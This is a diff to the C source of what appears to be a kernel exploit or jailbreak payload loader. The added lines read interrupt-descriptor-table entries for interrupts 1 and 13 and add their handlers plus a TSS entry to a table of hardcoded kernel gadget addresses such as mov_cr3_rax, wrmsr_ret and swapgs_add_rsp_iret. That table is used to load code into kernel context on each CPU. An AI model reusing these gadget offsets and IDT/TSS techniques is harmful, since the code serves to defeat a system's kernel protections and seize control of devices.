@@ -253,6 +253,12 @@ int main()
 {
     mlock(kek, kek_end-kek);
     mlock(uek, uek_end-uek);
+    uint64_t int1_handler;
+    copyout(&int1_handler, IDT+16*1, 2);
+    copyout((char*)&int1_handler + 2, IDT+16*1+6, 6);
+    uint64_t int13_handler;
+    copyout(&int13_handler, IDT+16*13, 2);
+    copyout((char*)&int13_handler + 2, IDT+16*13+6, 6);
     const char* symbols[] = {
         "add_rsp_iret",
         "copyin",
@@ -261,10 +267,12 @@ int main()
         "dr2gpr_start",
         "gpr2dr_1_start",
         "gpr2dr_2_start",
-        "justreturn",
-        "justreturn_pop",
+        "int1_handler",
+        "int13_handler",
         ".ist_errc",
         ".ist_noerrc",
+        "justreturn",
+        "justreturn_pop",
         "mov_cr3_rax",
         "mov_rdi_cr3",
         "nop_ret",
@@ -277,6 +285,7 @@ int main()
         "syscall_after",
         "syscall_before",
         "sysents",
+        ".tss",
         ".uelf_cr3",
         ".uelf_entry",
         "wrmsr_ret",
@@ -290,10 +299,12 @@ int main()
         0xffffffff80f837a8, // dr2gpr_start
         0xffffffff80f8381e, // gpr2dr_1_start
         0xffffffff802ffeba, // gpr2dr_2_start
+        int1_handler,       // int1_handler
+        int13_handler,      // int13_handler
+        0x1237,             // .ist_errc
+        0x1238,             // .ist_noerrc
         0xffffffff80f85550, // justreturn
         0xffffffff80f85558, // justreturn_pop
-        0x1237,    // ist_errc
-        0x1238,    // ist_noerrc
         0xffffffff80f82d87, // mov_cr3_rax
         0xffffffff80cc27ed, // mov_rdi_cr3
         0xffffffff802ff132, // nop_ret
@@ -302,16 +313,17 @@ int main()
         0xffffffff80f84f80, // push_pop_all_iret
         0xffffffff80f81f53, // rdmsr_start
         0xffffffff80f9e779, // rep_movsb_pop_rbp_ret
-        0xffffffff80f8568b, // swapgs_add_rsp_iret, XXX
+        0xffffffff80f8568b, // swapgs_add_rsp_iret
         0xffffffff80fa168e, // syscall_after
         0xffffffff80fa168b, // syscall_before
         0xffffffff819a7840, // sysents
+        0x123a,             // .tss
         0x1235,             // .uelf_cr3
         0x1236,             // .uelf_entry
         0xffffffff80f84756, // wrmsr_ret
         0,
     };
-    size_t pcpu_idx, uelf_cr3_idx, uelf_entry_idx, ist_errc_idx, ist_noerrc_idx;
+    size_t pcpu_idx, uelf_cr3_idx, uelf_entry_idx, ist_errc_idx, ist_noerrc_idx, tss_idx;
     for(size_t i = 0; values[i]; i++)
         switch(values[i])
         {
@@ -320,6 +332,7 @@ int main()
         case 0x1236: uelf_entry_idx = i; break;
         case 0x1237: ist_errc_idx = i; break;
         case 0x1238: ist_noerrc_idx = i; break;
+        case 0x123a: tss_idx = i; break;
         }
     uint64_t uelf_bases[NCPUS];
     uint64_t kelf_bases[NCPUS];
@@ -331,6 +344,7 @@ int main()
         values[uelf_entry_idx] = 0;
         values[ist_errc_idx] = TSS(cpu)+28+3*8;
         values[ist_noerrc_idx] = TSS(cpu)+28+7*8;
+        values[tss_idx] = TSS(cpu);
         void* uelf_entry = 0;
         void* uelf_base[2] = {0};
         char* uelf = load_kelf(uek, symbols, values, uelf_base, &uelf_entry, 0x400000);
